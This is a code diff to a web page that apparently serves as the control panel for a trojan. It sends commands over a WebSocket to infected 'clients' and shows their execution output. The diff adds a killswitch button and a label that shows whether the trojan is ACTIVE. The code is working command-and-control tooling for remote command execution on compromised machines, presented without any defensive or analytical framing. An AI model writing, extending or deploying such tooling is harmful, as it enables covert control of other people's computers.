@@ -12,6 +12,10 @@
     <br />
     <br />
 
+    <button id="ksw" disabled>Killswitch</button><label for="ksw" style="font-family: sans-serif;"> Trojan: <code id="trojan" style="font-weight: 600;"></code></label>
+    <br />
+    <br />
+
     <input id="client" placeholder="Client" disabled />
     <input id="cmd" placeholder="Command" disabled />
     <button id="btn" disabled>Send</button>
@@ -30,6 +34,9 @@
         const txt = document.getElementById("txt")
         const clientsTxt = document.getElementById("clientsTxt")
         const clients = document.getElementById("clients")
+
+        const ksw = document.getElementById("ksw")
+        const trojan = document.getElementById("trojan")
 
         webUserBtn.addEventListener("click", () => {
             if(!webUser) return
@@ -58,6 +65,15 @@
                         case "msg":
                             console.log(msg)
                             break;
+                        case "ksw":
+                            if(!msg.ksw){
+                                trojan.innerText = "ACTIVE"
+                                trojan.style.color = "red"
+                            } else {
+                                trojan.innerText = "NOT ACTIVE"
+                                trojan.style.color = "green"
+                            }
+                            break;
                         case "exec":
                             console.log(msg.value)
                             break;
@@ -79,9 +95,16 @@
                             cmdInput.disabled = false
                             txt.innerText = "Connected to: " +  serverUrl
 
+                            ksw.disabled = false
+                            
+                            ws.send(JSON.stringify({ type: "ksw", check: true }))
+
                             btn.addEventListener("click", () => {
                                 ws.send(JSON.stringify({ type: "cmd", value: cmdInput.value, to: clientInput.value }))
                                 cmdInput.value = ""
+                            })
+                            ksw.addEventListener("click", () => {
+                                ws.send(JSON.stringify({ type: "ksw" }))
                             })
                             break;
                     }
